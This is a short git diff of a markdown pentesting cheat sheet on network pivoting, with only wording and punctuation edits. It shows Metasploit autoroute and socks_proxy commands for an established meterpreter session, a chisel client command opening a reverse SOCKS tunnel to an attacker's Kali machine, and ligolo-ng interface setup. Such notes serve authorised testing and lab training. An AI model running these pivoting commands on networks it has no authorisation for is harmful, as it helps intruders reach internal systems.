@@ -12,8 +12,7 @@ Once you get the meterpreter session running:
 ```shell
 use multi/manage/autoroute
 ```
-set CMD audoadd and SESSION.
-and 
+set CMD audoadd and SESSION and 
 ```shell
 use auxiliary/server/socks_proxy
 ```
@@ -40,9 +39,9 @@ chisel.exe client <kali_ip>:8080 R:1080:socks
 &nbsp;
 
 <span style="font-size: 25px; color:white"><b>Ligolo-ng</b></span>
-VPN-like port forwarding
+VPN-like port forwarding.
 
-Config
+Config:
 ```shell
 sudo ip tuntap add user scare mode tun ligolo && sudo ip link set ligolo up
 ```
